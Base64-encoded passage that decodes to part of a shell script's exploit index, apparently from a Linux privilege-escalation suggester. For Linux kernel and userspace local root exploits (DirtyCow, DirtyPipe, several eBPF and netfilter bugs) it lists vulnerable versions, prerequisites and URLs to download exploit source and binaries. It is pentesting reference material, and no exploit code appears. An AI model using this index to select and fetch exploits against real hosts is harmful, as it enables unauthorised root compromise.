MDYxMQphdXRob3I6IFBoaWwgT2VzdGVyCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtNTE5NV0ke3R4dHJzdH0gZGlydHljb3cgMgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjIyLHZlcjw9NC44LjMKVGFnczogZGViaWFuPTd8OCxSSEVMPTV8Nnw3LHVidW50dT0xNC4wNHwxMi4wNCx1YnVudHU9MTAuMDR7a2VybmVsOjIuNi4zMi0yMS1nZW5lcmljfSx1YnVudHU9MTYuMDR7a2VybmVsOjQuNC4wLTIxLWdlbmVyaWN9ClJhbms6IDQKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vZGlydHljb3cvZGlydHljb3cuZ2l0aHViLmlvL3dpa2kvVnVsbmVyYWJpbGl0eURldGFpbHMKZXh0LXVybDogaHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG93bmxvYWQvNDA4NDcKQ29tbWVudHM6IEZvciBSSEVML0NlbnRPUyBzZWUgZXhhY3QgdnVsbmVyYWJsZSB2ZXJzaW9ucyBoZXJlOiBodHRwczovL2FjY2Vzcy5yZWRoYXQuY29tL3NpdGVzL2RlZmF1bHQvZmlsZXMvcmgtY3ZlLTIwMTYtNTE5NV81LnNoCmV4cGxvaXQtZGI6IDQwODM5CmF1dGhvcjogRmlyZUZhcnQgKGF1dGhvciBvZiBleHBsb2l0IGF0IEVEQiA0MDgzOSk7IEdhYnJpZWxlIEJvbmFjaW5pIChhdXRob3Igb2YgZXhwbG9pdCBhdCAnZXh0LXVybCcpCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtODY1NV0ke3R4dHJzdH0gY2hvY29ib19yb290ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj00LjQuMCx2ZXI8NC45LENPTkZJR19VU0VSX05TPXksc3lzY3RsOmtlcm5lbC51bnByaXZpbGVnZWRfdXNlcm5zX2Nsb25lPT0xClRhZ3M6IHVidW50dT0oMTQuMDR8MTYuMDQpe2tlcm5lbDo0LjQuMC0oMjF8MjJ8MjR8Mjh8MzF8MzR8MzZ8Mzh8NDJ8NDN8NDV8NDd8NTEpLWdlbmVyaWN9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxNi8xMi8wNi8xCkNvbW1lbnRzOiBDQVBfTkVUX1JBVyBjYXBhYmlsaXR5IGlzIG5lZWRlZCBPUiBDT05GSUdfVVNFUl9OUz15IG5lZWRzIHRvIGJlIGVuYWJsZWQKYmluLXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yay9tYXN0ZXIvZGF0YS9leHBsb2l0cy9DVkUtMjAxNi04NjU1L2Nob2NvYm9fcm9vdApleHBsb2l0LWRiOiA0MDg3MQphdXRob3I6IHJlYmVsCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtOTc5M10ke3R4dHJzdH0gU09fe1NORHxSQ1Z9QlVGRk9SQ0UKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuMTEsdmVyPDQuOC4xNCxDT05GSUdfVVNFUl9OUz15LHN5c2N0bDprZXJuZWwudW5wcml2aWxlZ2VkX3VzZXJuc19jbG9uZT09MQpUYWdzOgpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL3hhaXJ5L2tlcm5lbC1leHBsb2l0cy90cmVlL21hc3Rlci9DVkUtMjAxNi05NzkzCnNyYy11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94YWlyeS9rZXJuZWwtZXhwbG9pdHMvbWFzdGVyL0NWRS0yMDE2LTk3OTMvcG9jLmMKQ29tbWVudHM6IENBUF9ORVRfQURNSU4gY2FwcyBPUiBDT05GSUdfVVNFUl9OUz15IG5lZWRlZC4gTm8gU01FUC9TTUFQL0tBU0xSIGJ5cGFzcyBpbmNsdWRlZC4gVGVzdGVkIGluIFFFTVUgb25seQpleHBsb2l0LWRiOiA0MTk5NQphdXRob3I6IEFuZHJleSAneGFpcnknIEtvbm92YWxvdgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTYwNzRdJHt0eHRyc3R9IGRjY3AKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4xOCx2ZXI8PTQuOS4xMSxDT05GSUdfSVBfRENDUD1bbXldClRhZ3M6IHVidW50dT0oMTQuMDR8MTYuMDQpe2tlcm5lbDo0LjQuMC02Mi1nZW5lcmljfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTcvMDIvMjIvMwpDb21tZW50czogUmVxdWlyZXMgS2VybmVsIGJlIGJ1aWx0IHdpdGggQ09ORklHX0lQX0RDQ1AgZW5hYmxlZC4gSW5jbHVkZXMgcGFydGlhbCBTTUVQL1NNQVAgYnlwYXNzCmV4cGxvaXQtZGI6IDQxNDU4CmF1dGhvcjogQW5kcmV5ICd4YWlyeScgS29ub3ZhbG92CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTctNzMwOF0ke3R4dHJzdH0gYWZfcGFja2V0ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjIsdmVyPD00LjEwLjYsQ09ORklHX1VTRVJfTlM9eSxzeXNjdGw6a2VybmVsLnVucHJpdmlsZWdlZF91c2VybnNfY2xvbmU9PTEKVGFnczogdWJ1bnR1PTE2LjA0e2tlcm5lbDo0LjguMC0oMzR8MzZ8Mzl8NDF8NDJ8NDR8NDUpLWdlbmVyaWN9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2dvb2dsZXByb2plY3R6ZXJvLmJsb2dzcG90LmNvbS8yMDE3LzA1L2V4cGxvaXRpbmctbGludXgta2VybmVsLXZpYS1wYWNrZXQuaHRtbApzcmMtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veGFpcnkva2VybmVsLWV4cGxvaXRzL21hc3Rlci9DVkUtMjAxNy03MzA4L3BvYy5jCmV4dC11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iY29sZXMva2VybmVsLWV4cGxvaXRzL21hc3Rlci9DVkUtMjAxNy03MzA4L3BvYy5jCkNvbW1lbnRzOiBDQVBfTkVUX1JBVyBjYXAgb3IgQ09ORklHX1VTRVJfTlM9eSBuZWVkZWQuIE1vZGlmaWVkIHZlcnNpb24gYXQgJ2V4dC11cmwnIGFkZHMgc3VwcG9ydCBmb3IgYWRkaXRpb25hbCBrZXJuZWxzCmJpbi11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsvbWFzdGVyL2RhdGEvZXhwbG9pdHMvY3ZlLTIwMTctNzMwOC9leHBsb2l0CmV4cGxvaXQtZGI6IDQxOTk0CmF1dGhvcjogQW5kcmV5ICd4YWlyeScgS29ub3ZhbG92IChvcmdpbmFsIGV4cGxvaXQgYXV0aG9yKTsgQnJlbmRhbiBDb2xlcyAoYXV0aG9yIG9mIGV4cGxvaXQgdXBkYXRlIGF0ICdleHQtdXJsJykKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNy0xNjk5NV0ke3R4dHJzdH0gZUJQRl92ZXJpZmllcgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49NC40LHZlcjw9NC4xNC44LENPTkZJR19CUEZfU1lTQ0FMTD15LHN5c2N0bDprZXJuZWwudW5wcml2aWxlZ2VkX2JwZl9kaXNhYmxlZCE9MQpUYWdzOiBkZWJpYW49OS4we2tlcm5lbDo0LjkuMC0zLWFtZDY0fSxmZWRvcmE9MjV8MjZ8MjcsdWJ1bnR1PTE0LjA0e2tlcm5lbDo0LjQuMC04OS1nZW5lcmljfSx1YnVudHU9KDE2LjA0fDE3LjA0KXtrZXJuZWw6NC4oOHwxMCkuMC0oMTl8Mjh8NDUpLWdlbmVyaWN9ClJhbms6IDUKYW5hbHlzaXMtdXJsOiBodHRwczovL3JpY2tsYXJhYmVlLmJsb2dzcG90LmNvbS8yMDE4LzA3L2VicGYtYW5kLWFuYWx5c2lzLW9mLWdldC1yZWt0LWxpbnV4Lmh0bWwKQ29tbWVudHM6IENPTkZJR19CUEZfU1lTQ0FMTCBuZWVkcyB0byBiZSBzZXQgJiYga2VybmVsLnVucHJpdmlsZWdlZF9icGZfZGlzYWJsZWQgIT0gMQpiaW4tdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrL21hc3Rlci9kYXRhL2V4cGxvaXRzL2N2ZS0yMDE3LTE2OTk1L2V4cGxvaXQub3V0CmV4cGxvaXQtZGI6IDQ1MDEwCmF1dGhvcjogUmljayBMYXJhYmVlCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTctMTAwMDExMl0ke3R4dHJzdH0gTkVUSUZfRl9VRk8KUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTQuNCx2ZXI8PTQuMTMsQ09ORklHX1VTRVJfTlM9eSxzeXNjdGw6a2VybmVsLnVucHJpdmlsZWdlZF91c2VybnNfY2xvbmU9PTEKVGFnczogdWJ1bnR1PTE0LjA0e2tlcm5lbDo0LjQuMC0qfSx1YnVudHU9MTYuMDR7a2VybmVsOjQuOC4wLSp9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxNy8wOC8xMy8xCnNyYy11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94YWlyeS9rZXJuZWwtZXhwbG9pdHMvbWFzdGVyL0NWRS0yMDE3LTEwMDAxMTIvcG9jLmMKZXh0LXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jjb2xlcy9rZXJuZWwtZXhwbG9pdHMvbWFzdGVyL0NWRS0yMDE3LTEwMDAxMTIvcG9jLmMKQ29tbWVudHM6IENBUF9ORVRfQURNSU4gY2FwIG9yIENPTkZJR19VU0VSX05TPXkgbmVlZGVkLiBTTUVQL0tBU0xSIGJ5cGFzcyBpbmNsdWRlZC4gTW9kaWZpZWQgdmVyc2lvbiBhdCAnZXh0LXVybCcgYWRkcyBzdXBwb3J0IGZvciBhZGRpdGlvbmFsIGRpc3Ryb3Mva2VybmVscwpiaW4tdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrL21hc3Rlci9kYXRhL2V4cGxvaXRzL2N2ZS0yMDE3LTEwMDAxMTIvZXhwbG9pdC5vdXQKZXhwbG9pdC1kYjoKYXV0aG9yOiBBbmRyZXkgJ3hhaXJ5JyBLb25vdmFsb3YgKG9yZ2luYWwgZXhwbG9pdCBhdXRob3IpOyBCcmVuZGFuIENvbGVzIChhdXRob3Igb2YgZXhwbG9pdCB1cGRhdGUgYXQgJ2V4dC11cmwnKQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTEwMDAyNTNdJHt0eHRyc3R9IFBJRV9zdGFja19jb3JydXB0aW9uClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjIsdmVyPD00LjEzLHg4Nl82NApUYWdzOiBSSEVMPTYsUkhFTD03e2tlcm5lbDozLjEwLjAtNTE0LjIxLjJ8My4xMC4wLTUxNC4yNi4xfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cucXVhbHlzLmNvbS8yMDE3LzA5LzI2L2xpbnV4LXBpZS1jdmUtMjAxNy0xMDAwMjUzL2N2ZS0yMDE3LTEwMDAyNTMudHh0CnNyYy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAxNy8wOS8yNi9saW51eC1waWUtY3ZlLTIwMTctMTAwMDI1My9jdmUtMjAxNy0xMDAwMjUzLmMKZXhwbG9pdC1kYjogNDI4ODcKYXV0aG9yOiBRdWFseXMKQ29tbWVudHM6CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTgtNTMzM10ke3R4dHJzdH0gcmRzX2F0b21pY19mcmVlX29wIE5VTEwgcG9pbnRlciBkZXJlZmVyZW5jZQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49NC40LHZlcjw9NC4xNC4xMyxjbWQ6Z3JlcCAtcWkgcmRzIC9wcm9jL21vZHVsZXMseDg2XzY0ClRhZ3M6IHVidW50dT0xNi4wNHtrZXJuZWw6NC40LjB8NC44LjB9ClJhbms6IDEKc3JjLXVybDogaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS93Ym93bGluZy85ZDMyNDkyYmQ5NmQ5ZTdjM2JmNTJlMjNhMGFjMzBhNC9yYXcvOTU5MzI1ODE5Yzc4MjQ4YTY0MzcxMDJiYjI4OWJiODU3OGExMzVjZC9jdmUtMjAxOC01MzMzLXBvYy5jCmV4dC11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iY29sZXMva2VybmVsLWV4cGxvaXRzL21hc3Rlci9DVkUtMjAxOC01MzMzL2N2ZS0yMDE4LTUzMzMuYwpDb21tZW50czogcmRzLmtvIGtlcm5lbCBtb2R1bGUgbmVlZHMgdG8gYmUgbG9hZGVkLiBNb2RpZmllZCB2ZXJzaW9uIGF0ICdleHQtdXJsJyBhZGRzIHN1cHBvcnQgZm9yIGFkZGl0aW9uYWwgdGFyZ2V0cyBhbmQgYnlwYXNzaW5nIEtBU0xSLgphdXRob3I6IHdib3dsaW5nIChvcmdpbmFsIGV4cGxvaXQgYXV0aG9yKTsgYmNvbGVzIChhdXRob3Igb2YgZXhwbG9pdCB1cGRhdGUgYXQgJ2V4dC11cmwnKQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE4LTE4OTU1XSR7dHh0cnN0fSBzdWJ1aWRfc2hlbGwKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTQuMTUsdmVyPD00LjE5LjIsQ09ORklHX1VTRVJfTlM9eSxzeXNjdGw6a2VybmVsLnVucHJpdmlsZWdlZF91c2VybnNfY2xvbmU9PTEsY21kOlsgLXUgL3Vzci9iaW4vbmV3dWlkbWFwIF0sY21kOlsgLXUgL3Vzci9iaW4vbmV3Z2lkbWFwIF0KVGFnczogdWJ1bnR1PTE4LjA0e2tlcm5lbDo0LjE1LjAtMjAtZ2VuZXJpY30sZmVkb3JhPTI4e2tlcm5lbDo0LjE2LjMtMzAxLmZjMjh9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2J1Z3MuY2hyb21pdW0ub3JnL3AvcHJvamVjdC16ZXJvL2lzc3Vlcy9kZXRhaWw/aWQ9MTcxMgpzcmMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXRkYi1iaW4tc3Bsb2l0cy9yYXcvbWFzdGVyL2Jpbi1zcGxvaXRzLzQ1ODg2LnppcApleHBsb2l0LWRiOiA0NTg4NgphdXRob3I6IEphbm4gSG9ybgpDb21tZW50czogQ09ORklHX1VTRVJfTlMgbmVlZHMgdG8gYmUgZW5hYmxlZApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE5LTEzMjcyXSR7dHh0cnN0fSBQVFJBQ0VfVFJBQ0VNRQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49NCx2ZXI8NS4xLjE3LHN5c2N0bDprZXJuZWwueWFtYS5wdHJhY2Vfc2NvcGU9PTAseDg2XzY0ClRhZ3M6IHVidW50dT0xNi4wNHtrZXJuZWw6NC4xNS4wLSp9LHVidW50dT0xOC4wNHtrZXJuZWw6NC4xNS4wLSp9LGRlYmlhbj05e2tlcm5lbDo0LjkuMC0qfSxkZWJpYW49MTB7a2VybmVsOjQuMTkuMC0qfSxmZWRvcmE9MzB7a2VybmVsOjUuMC45LSp9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2J1Z3MuY2hyb21pdW0ub3JnL3AvcHJvamVjdC16ZXJvL2lzc3Vlcy9kZXRhaWw/aWQ9MTkwMwpzcmMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXRkYi1iaW4tc3Bsb2l0cy9yYXcvbWFzdGVyL2Jpbi1zcGxvaXRzLzQ3MTMzLnppcApleHQtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmNvbGVzL2tlcm5lbC1leHBsb2l0cy9tYXN0ZXIvQ1ZFLTIwMTktMTMyNzIvcG9jLmMKQ29tbWVudHM6IFJlcXVpcmVzIGFuIGFjdGl2ZSBQb2xLaXQgYWdlbnQuCmV4cGxvaXQtZGI6IDQ3MTMzCmV4cGxvaXQtZGI6IDQ3MTYzCmF1dGhvcjogSmFubiBIb3JuIChvcmdpbmFsIGV4cGxvaXQgYXV0aG9yKTsgYmNvbGVzIChhdXRob3Igb2YgZXhwbG9pdCB1cGRhdGUgYXQgJ2V4dC11cmwnKQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE5LTE1NjY2XSR7dHh0cnN0fSBYRlJNX1VBRgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Myx2ZXI8NS4wLjE5LENPTkZJR19VU0VSX05TPXksc3lzY3RsOmtlcm5lbC51bnByaXZpbGVnZWRfdXNlcm5zX2Nsb25lPT0xLENPTkZJR19YRlJNPXkKVGFnczoKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vZHVhc3ludC5jb20vYmxvZy91YnVudHUtY2VudG9zLXJlZGhhdC1wcml2ZXNjCmJpbi11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9kdWFzeW50L3hmcm1fcG9jL3Jhdy9tYXN0ZXIvbHVja3kwCkNvbW1lbnRzOiBDT05GSUdfVVNFUl9OUyBuZWVkcyB0byBiZSBlbmFibGVkOyBDT05GSUdfWEZSTSBuZWVkcyB0byBiZSBlbmFibGVkCmF1dGhvcjogVml0YWx5ICd2bmlrJyBOaWtvbGVua28KRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAyMS0yNzM2NV0ke3R4dHJzdH0gbGludXgtaXNjc2kKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI8PTUuMTEuMyxDT05GSUdfU0xBQl9GUkVFTElTVF9IQVJERU5FRCE9eQpUYWdzOiBSSEVMPTgKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vYmxvZy5ncmltbS1jby5jb20vMjAyMS8wMy9uZXctb2xkLWJ1Z3MtaW4tbGludXgta2VybmVsLmh0bWwKc3JjLXVybDogaHR0cHM6Ly9jb2RlbG9hZC5naXRodWIuY29tL2dyaW1tLWNvL05vdFF1aXRlMERheUZyaWRheS96aXAvdHJ1bmsKQ29tbWVudHM6IENPTkZJR19TTEFCX0ZSRUVMSVNUX0hBUkRFTkVEIG11c3Qgbm90IGJlIGVuYWJsZWQKYXV0aG9yOiBHUklNTQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDIxLTM0OTBdJHt0eHRyc3R9IGVCUEYgQUxVMzIgYm91bmRzIHRyYWNraW5nIGZvciBiaXR3aXNlIG9wcwpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49NS43LHZlcjw1LjEyLENPTkZJR19CUEZfU1lTQ0FMTD15LHN5c2N0bDprZXJuZWwudW5wcml2aWxlZ2VkX2JwZl9kaXNhYmxlZCE9MQpUYWdzOiB1YnVudHU9MjAuMDR7a2VybmVsOjUuOC4wLSgyNXwyNnwyN3wyOHwyOXwzMHwzMXwzMnwzM3wzNHwzNXwzNnwzN3wzOHwzOXw0MHw0MXw0Mnw0M3w0NHw0NXw0Nnw0N3w0OHw0OXw1MHw1MXw1MiktKn0sdWJ1bnR1PTIxLjA0e2tlcm5lbDo1LjExLjAtMTYtKn0KUmFuazogNQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3LmdyYXBsc2VjdXJpdHkuY29tL3Bvc3Qva2VybmVsLXB3bmluZy13aXRoLWVicGYtYS1sb3ZlLXN0b3J5CnNyYy11cmw6IGh0dHBzOi8vY29kZWxvYWQuZ2l0aHViLmNvbS9jaG9tcGllMTMzNy9MaW51eF9MUEVfZUJQRl9DVkUtMjAyMS0zNDkwL3ppcC9tYWluCkNvbW1lbnRzOiBDT05GSUdfQlBGX1NZU0NBTEwgbmVlZHMgdG8gYmUgc2V0ICYmIGtlcm5lbC51bnByaXZpbGVnZWRfYnBmX2Rpc2FibGVkICE9IDEKYXV0aG9yOiBjaG9tcGllMTMzNwpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDIxLTIyNTU1XSR7dHh0cnN0fSBOZXRmaWx0ZXIgaGVhcCBvdXQtb2YtYm91bmRzIHdyaXRlClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTksdmVyPD01LjEyLXJjNgpUYWdzOiB1YnVudHU9MjAuMDR7a2VybmVsOjUuOC4wLSp9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2dvb2dsZS5naXRodWIuaW8vc2VjdXJpdHktcmVzZWFyY2gvcG9jcy9saW51eC9jdmUtMjAyMS0yMjU1NS93cml0ZXVwLmh0bWwKc3JjLXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dvb2dsZS9zZWN1cml0eS1yZXNlYXJjaC9tYXN0ZXIvcG9jcy9saW51eC9jdmUtMjAyMS0yMjU1NS9leHBsb2l0LmMKZXh0LXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jjb2xlcy9rZXJuZWwtZXhwbG9pdHMvbWFzdGVyL0NWRS0yMDIxLTIyNTU1L2V4cGxvaXQuYwpDb21tZW50czogaXBfdGFibGVzIGtlcm5lbCBtb2R1bGUgbXVzdCBiZSBsb2FkZWQKZXhwbG9pdC1kYjogNTAxMzUKYXV0aG9yOiB0aGVmbG93IChvcmdpbmFsIGV4cGxvaXQgYXV0aG9yKTsgYmNvbGVzIChhdXRob3Igb2YgZXhwbG9pdCB1cGRhdGUgYXQgJ2V4dC11cmwnKQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDIyLTA4NDddJHt0eHRyc3R9IERpcnR5UGlwZQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49NS44LHZlcjw9NS4xNi4xMQpUYWdzOiB1YnVudHU9KDIwLjA0fDIxLjA0KSxkZWJpYW49MTEKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vZGlydHlwaXBlLmNtNGFsbC5jb20vCnNyYy11cmw6IGh0dHBzOi8vaGF4eC5pbi9maWxlcy9kaXJ0eXBpcGV6LmMKZXhwbG9pdC1kYjogNTA4MDgKYXV0aG9yOiBibGFzdHkgKG9yaWdpbmFsIGV4cGxvaXQgYXV0aG9yOiBNYXggS2VsbGVybWFubikKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAyMi0yNTg2XSR7dHh0cnN0fSBuZnRfb2JqZWN0IFVBRgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4xNixDT05GSUdfVVNFUl9OUz15LHN5c2N0bDprZXJuZWwudW5wcml2aWxlZ2VkX3VzZXJuc19jbG9uZT09MQpUYWdzOiB1YnVudHU9KDIwLjA0KXtrZXJuZWw6NS4xMi4xM30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAyMi8wOC8yOS81CnNyYy11cmw6IGh0dHBzOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAyMi8wOC8yOS81LzEKQ29tbWVudHM6IGtlcm5lbC51bnByaXZpbGVnZWRfdXNlcm5zX2Nsb25lPTEgcmVxdWlyZWQgKHRvIG9idGFpbiBDQVBfTkVUX0FETUlOKQphdXRob3I6IHZ1bG5lcmFiaWxpdHkgZGlzY292ZXJ5OiBUZWFtIE9yY2Egb2YgU2VhIFNlY3VyaXR5OyBFeHBsb2l0IGF1dGhvcjogQWxlamFuZHJvIEd1ZXJyZXJvCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMjItMzIyNTBdJHt0eHRyc3R9IG5mdF9vYmplY3QgVUFGIChORlRfTVNHX05FV1NFVCkKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI8NS4xOC4xLENPTkZJR19VU0VSX05TPXksc3lzY3RsOmtlcm5lbC51bnByaXZpbGVnZWRfdXNlcm5zX2Nsb25lPT0xClRhZ3M6IHVidW50dT0oMjIuMDQpe2tlcm5lbDo1LjE1LjAtMjctZ2VuZXJpY30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vcmVzZWFyY2gubmNjZ3JvdXAuY29tLzIwMjIvMDkvMDEvc2V0dGxlcnMtb2YtbmV0bGluay1leHBsb2l0aW5nLWEtbGltaXRlZC11YWYtaW4tbmZfdGFibGVzLWN2ZS0yMDIyLTMyMjUwLwphbmFseXNpcy11cmw6IGh0dHBzOi8vYmxvZy50aGVvcmkuaW8vcmVzZWFyY2gvQ1ZFLTIwMjItMzIyNTAtbGludXgta2VybmVsLWxwZS0yMDIyLwpzcmMtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdGhlb3JpLWlvL0NWRS0yMDIyLTMyMjUwLWV4cGxvaXQvbWFpbi9leHAuYwpDb21tZW50czoga2VybmVsLnVucHJpdmlsZWdlZF91c2VybnNfY2xvbmU9MSByZXF1aXJlZCAodG8gb2J0YWluIENBUF9ORVRfQURNSU4pCmF1dGhvcjogdnVsbmVyYWJpbGl0eSBkaXNjb3Zlcnk6IEVERyBUZWFtIGZyb20gTkNDIEdyb3VwOyBBdXRob3Igb2YgdGhpcyBleHBsb2l0OiB0aGVvcmkuaW8KRU9GCikKCgojIyMjIyMjIyMjIyMgVVNFUlNQQUNFIEVYUExPSVRTICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpuPTAKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDQtMDE4Nl0ke3R4dHJzdH0gc2FtYmEKUmVxczogcGtnPXNhbWJhLHZlcjw9Mi4yLjgKVGFnczogClJhbms6IDEKZXhwbG9pdC1kYjogMjM2NzQKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMDktMTE4NV0ke3R4dHJzdH0gdWRldgpSZXFzOiBwa2c9dWRldix2ZXI8MTQxLGNtZDpbWyAtZiAvZXRjL3VkZXYvcnVsZXMuZC85NS11ZGV2LWxhdGUucnVsZXMgfHwgLWYgL2xpYi91ZGV2L3J1bGVzLmQvOTUtdWRldi1sYXRlLnJ1bGVzIF1dClRhZ3M6IHVidW50dT04LjEwfDkuMDQKUmFuazogMQpleHBsb2l0LWRiOiA4NTcyCkNvbW1lbnRzOiBWZXJzaW9uPDEuNC4xIHZ1bG5lcmFibGUgYnV0IGRpc3Ryb3MgdXNlIG93biB2ZXJzaW9uaW5nIHNjaGVtZS4gTWFudWFsIHZlcmlmaWNhdGlvbiBuZWVkZWQgCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YK